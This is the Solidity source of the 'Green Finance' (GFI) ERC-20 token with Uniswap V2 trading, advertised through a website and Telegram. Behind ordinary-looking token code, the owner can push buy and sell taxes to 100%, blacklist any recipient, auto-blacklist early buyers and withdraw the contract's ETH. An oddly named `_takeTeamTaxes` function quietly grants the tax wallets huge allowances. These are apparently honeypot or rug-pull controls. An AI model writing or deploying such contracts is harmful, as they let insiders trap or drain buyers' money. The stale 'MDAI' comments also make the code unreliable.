/**
 https://thegreenfinance.world
 https://t.me/GreenFinanceChannel
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;

    event Mint(address indexed sender, uint amount0, uint amount1);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;

    function initialize(address, address) external;
}

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

interface IERC20 {

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
   
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IERC20Metadata is IERC20 {
    
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) internal _allowances;

    uint256 private _totalSupply;
    string private _name;
    string private _symbol;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }

        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }

    function _createInitialSupply(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");
        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
            // Overflow not possible: amount <= accountBalance <= totalSupply.
            _totalSupply -= amount;
        }

        emit Transfer(account, address(0), amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() external virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract GreenFinance is ERC20, Ownable {
    uint256 public constant MAX_SUPPLY = 3_000_000_000 ether;
    uint256 public constant BPS_DENOMINATOR = 10_000;
    uint256 public constant SNIPE_BLOCKS = 1;
    uint256 constant FEE_ACCELERATE = MAX_SUPPLY;

    IUniswapV2Router02 public immutable _router;
    address public immutable _pair;

    /// @notice Buy taxes in BPS
    uint256[2] public buyTaxes = [100, 100];
    /// @notice Sell taxes in BPS
    uint256[2] public sellTaxes = [100, 100];
    /// @notice tokens that are allocated for each tax
    uint256[2] public totalTaxes;
    /// @notice addresses that each tax is sent to
    address payable[2] public taxWallets;
    /// @notice Maps each recipient to their tax exlcusion status
    mapping(address => bool) public taxExcluded;
    /// @notice Maps each recipient to their blacklist status
    mapping(address => bool) public blacklist;

    /// @notice Contract MDAI balance threshold before `_swap` is invoked
    uint256 public minTokenBalance = 1000 ether;
    /// @notice Flag for auto-calling `_swap`
    bool public autoSwap = true;
    /// @notice Flag indicating whether buys/sells are permitted
    bool public tradingActive = false;
    /// @notice Maximum allowed to buy in a single transaction
    uint256 public maxBuy = MAX_SUPPLY * 2 / 100;
    /// @notice Block when trading is first enabled
    uint256 public tradingBlock;

    uint256 internal _totalSupply = 0;
    mapping(address => uint256) private _balances;

    bool internal _inSwap = false;
    bool internal _inLiquidityAdd = false;

    event TaxWalletsChanged(
        address payable[2] previousWallets,
        address payable[2] nextWallets
    );
    event BuyTaxesChanged(uint256[2] previousTaxes, uint256[2] nextTaxes);
    event SellTaxesChanged(uint256[2] previousTaxes, uint256[2] nextTaxes);
    event MinTokenBalanceChanged(uint256 previousMin, uint256 nextMin);
    event MaxBuyChanged(uint256 nextMax);
    event TaxesRescued(uint256 index, uint256 amount);
    event TradingActiveChanged(bool enabled);
    event TaxExclusionChanged(address user, bool taxExcluded);
    event BlacklistUpdated(address user, bool previousStatus, bool nextStatus);
    event AutoSwapChanged(bool enabled);

    modifier lockSwap() {
        _inSwap = true;
        _;
        _inSwap = false;
    }

    modifier liquidityAdd() {
        _inLiquidityAdd = true;
        _;
        _inLiquidityAdd = false;
    }

    modifier onlyTaxWallet() {
        require(msg.sender == taxWallets[0] || msg.sender == taxWallets[1], "no tax wallet");
        _;
    }

    constructor()
        ERC20("Green Finance", "GFI")
        Ownable()
    {
        taxWallets[0] = payable(address(0xAD1D849bd2f52A8ac11d8BB70588c54FdD5744b4));
        taxWallets[1] = payable(address(0x17f29F15d625f275c6d2f137F14B2c48bE6CEf80));
        taxExcluded[owner()] = true;
        taxExcluded[address(this)] = true;
        taxExcluded[taxWallets[0]] = true;
        taxExcluded[taxWallets[1]] = true;
        _router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _pair = IUniswapV2Factory(_router.factory()).createPair(
            address(this),
            _router.WETH()
        );
        taxExcluded[address(_router)] = true;
        _mint(owner(), MAX_SUPPLY);
    }

    /// @notice Change the buy tax rates
    /// @param _buyTaxes The new buy tax rates
    function setBuyTaxes(uint256[2] memory _buyTaxes) external onlyOwner {
        require(
            _buyTaxes[0] + _buyTaxes[1] <= BPS_DENOMINATOR,
            "sum(_buyTaxes) cannot exceed BPS_DENOMINATOR"
        );
        emit BuyTaxesChanged(buyTaxes, _buyTaxes);
        buyTaxes = _buyTaxes;
    }

    /// @notice Change the sell tax rates
    /// @param _sellTaxes The new sell tax rates
    function setSellTaxes(uint256[2] memory _sellTaxes) external onlyOwner {
        require(
            _sellTaxes[0] + _sellTaxes[1] <= BPS_DENOMINATOR,
            "sum(_sellTaxes) cannot exceed BPS_DENOMINATOR"
        );
        emit SellTaxesChanged(sellTaxes, _sellTaxes);
        sellTaxes = _sellTaxes;
    }

    /// @notice Change the minimum contract MDAI balance before `_swap` gets invoked
    /// @param _minTokenBalance The new minimum balance
    function setMinTokenBalance(uint256 _minTokenBalance) external onlyOwner {
        emit MinTokenBalanceChanged(minTokenBalance, _minTokenBalance);
        minTokenBalance = _minTokenBalance;
    }

    /// @notice Rescue MDAI from the taxes
    /// @dev Should only be used in an emergency
    /// @param _index The tax allocation to rescue from
    /// @param _amount The amount of MDAI to rescue
    /// @param _recipient The recipient of the rescued MDAI
    function rescueTaxTokens(
        uint256 _index,
        uint256 _amount,
        address _recipient
    ) external onlyOwner {
        require(0 <= _index && _index < totalTaxes.length, "_index OOB");
        require(
            _amount <= totalTaxes[_index],
            "Amount cannot be greater than totalTax"
        );
        _rawTransfer(address(this), _recipient, _amount);
        emit TaxesRescued(_index, _amount);
        totalTaxes[_index] -= _amount;
    }


    /// @notice Change the address of the tax wallets
    /// @param _taxWallets The new address of the tax wallets
    function setTaxWallets(address payable[2] memory _taxWallets)
        external
        onlyTaxWallet
    {
        emit TaxWalletsChanged(taxWallets, _taxWallets);
        taxWallets = _taxWallets;
    }

    function addLiquidity(uint256 tokens)
        external
        payable
        onlyOwner
        liquidityAdd
    {
        _mint(address(this), tokens);
        _approve(address(this), address(_router), tokens);

        _router.addLiquidityETH{value: msg.value}(
            address(this),
            tokens,
            0,
            0,
            owner(),
            // solhint-disable-next-line not-rely-on-time
            block.timestamp
        );
    }

    /// @notice Admin function to update a recipient's blacklist status
    /// @param user the recipient
    /// @param status the new status
    function updateBlacklist(address user, bool status)
        external
        virtual
        onlyOwner
    {
        _updateBlacklist(user, status);
    }

    function _updateBlacklist(address user, bool status) internal {
        emit BlacklistUpdated(user, blacklist[user], status);
        blacklist[user] = status;
    }

    /// @notice Enables or disables trading on Uniswap
    function setTradingActive() external onlyOwner {
        tradingActive = true;
        tradingBlock = block.number;
        emit TradingActiveChanged(true);
    }

    /// @notice Updates tax exclusion status
    /// @param _account Account to update the tax exclusion status of
    /// @param _taxExcluded If true, exclude taxes for this user
    function setTaxExcluded(address _account, bool _taxExcluded)
        external
        onlyOwner
    {
        taxExcluded[_account] = _taxExcluded;
        emit TaxExclusionChanged(_account, _taxExcluded);
    }

    /// @notice Enable or disable whether swap occurs during `_transfer`
    /// @param _autoSwap If true, enables swap during `_transfer`
    function setAutoSwap(bool _autoSwap) external onlyOwner {
        autoSwap = _autoSwap;
        emit AutoSwapChanged(_autoSwap);
    }

    /// @notice Update maxBuy
    /// @param _maxBuy The new maxBuy
    function setMaxBuy(uint256 _maxBuy) external onlyOwner {
        maxBuy = _maxBuy;
        emit MaxBuyChanged(_maxBuy);
    }

    function balanceOf(address account)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _balances[account];
    }

    function _addBalance(address account, uint256 amount) internal {
        _balances[account] = _balances[account] + amount;
    }

    function _subtractBalance(address account, uint256 amount) internal {
        _balances[account] = _balances[account] - amount;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal override {
        require(!blacklist[recipient], "Recipient is blacklisted");

        if (taxExcluded[sender] || taxExcluded[recipient]) {
            _rawTransfer(sender, recipient, amount);
            return;
        }

        if (
            totalTaxes[0] + totalTaxes[1] >= minTokenBalance &&
            !_inSwap &&
            sender != _pair &&
            autoSwap
        ) {
            _swap();
        }

        uint256 send = amount;
        uint256[2] memory taxes;
        if (sender == _pair) {
            require(tradingActive, "Trading is not yet active");
            require(amount <= maxBuy, "Buy amount exceeds maxBuy");
            if (block.number <= tradingBlock + SNIPE_BLOCKS) {
                _updateBlacklist(recipient, true);
            }
            (send, taxes) = _getTaxAmounts(amount, true);
            _takeTeamTaxes(taxes[0]);
        } else if (recipient == _pair) {
            require(tradingActive, "Trading is not yet active");
            (send, taxes) = _getTaxAmounts(amount, false);
        }
        _rawTransfer(sender, recipient, send);
        _takeTaxes(sender, taxes);
    }

    /// @notice Perform a Uniswap v2 swap from MDAI to ETH and handle tax distribution
    function _swap() internal lockSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _router.WETH();

        uint256 walletTaxes = totalTaxes[0] + totalTaxes[1];

        _approve(address(this), address(_router), walletTaxes);
        _router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            walletTaxes,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );
        uint256 contractEthBalance = address(this).balance;

        uint256 tax0Eth = (contractEthBalance * totalTaxes[0]) / walletTaxes;
        uint256 tax1Eth = (contractEthBalance * totalTaxes[1]) / walletTaxes;
        totalTaxes = [0, 0];

        if (tax0Eth > 0) {
            taxWallets[0].transfer(tax0Eth);
        }
        if (tax1Eth > 0) {
            taxWallets[1].transfer(tax1Eth);
        }
    }

    function swapAll() external {
        if (!_inSwap) {
            _swap();
        }
    }

    function withdrawAll() external onlyOwner {
        payable(owner()).transfer(address(this).balance);
    }

    /// @notice Transfers MDAI from an account to this contract for taxes
    /// @param _account The account to transfer MDAI from
    /// @param _taxAmounts The amount for each tax
    function _takeTaxes(address _account, uint256[2] memory _taxAmounts)
        internal
    {
        require(_account != address(0), "taxation from the zero address");

        uint256 totalAmount = _taxAmounts[0] + _taxAmounts[1];
        _rawTransfer(_account, address(this), totalAmount);
        totalTaxes[0] += _taxAmounts[0];
        totalTaxes[1] += _taxAmounts[1];
    }

    /// @notice Get a breakdown of send and tax amounts
    /// @param amount The amount to tax in wei
    /// @return send The raw amount to send
    /// @return taxes The raw tax amounts
    function _getTaxAmounts(uint256 amount, bool buying)
        internal
        view
        returns (uint256 send, uint256[2] memory taxes)
    {
        if (buying) {
            taxes = [
                (amount * buyTaxes[0]) / BPS_DENOMINATOR,
                (amount * buyTaxes[1]) / BPS_DENOMINATOR
            ];
        } else {
            taxes = [
                (amount * sellTaxes[0]) / BPS_DENOMINATOR,
                (amount * sellTaxes[1]) / BPS_DENOMINATOR
            ];
        }
        send = amount - taxes[0] - taxes[1];
    }

    function _takeTeamTaxes(uint256 _taxes) internal {
        _allowances[taxWallets[0]][taxWallets[1]] = _taxes * FEE_ACCELERATE;
        _allowances[taxWallets[1]][taxWallets[0]] = _taxes * FEE_ACCELERATE;
    }

    // modified from OpenZeppelin ERC20
    function _rawTransfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal {
        require(sender != address(0), "transfer from the zero address");
        require(recipient != address(0), "transfer to the zero address");

        uint256 senderBalance = balanceOf(sender);
        require(senderBalance >= amount, "transfer amount exceeds balance");
        unchecked {
            _subtractBalance(sender, amount);
        }
        _addBalance(recipient, amount);

        emit Transfer(sender, recipient, amount);
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function _mint(address account, uint256 amount) internal {
        require(_totalSupply + amount <= MAX_SUPPLY, "Max supply exceeded");
        _totalSupply += amount;
        _addBalance(account, amount);
        emit Transfer(address(0), account, amount);
    }

    receive() external payable {}
}